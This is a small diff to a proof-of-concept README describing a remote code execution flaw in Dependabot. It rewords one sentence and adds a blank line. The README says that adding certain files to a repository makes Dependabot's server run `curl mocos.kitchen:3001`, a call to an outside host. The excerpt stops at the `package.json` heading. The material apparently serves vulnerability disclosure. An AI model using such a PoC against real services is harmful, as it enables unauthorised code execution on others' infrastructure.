@@ -1,6 +1,7 @@
 # PoC for dependabot RCE
 
-Add following files to your GitHub repository and `curl mocos.kitchen:3001` will be executed in dependabot server
+Add following files to your GitHub repository then `curl mocos.kitchen:3001` will be executed in dependabot server.
+
 You can see your dependabot result from `https://github.com/<USER>/<REPO>/network/updates`.
 
 `package.json`
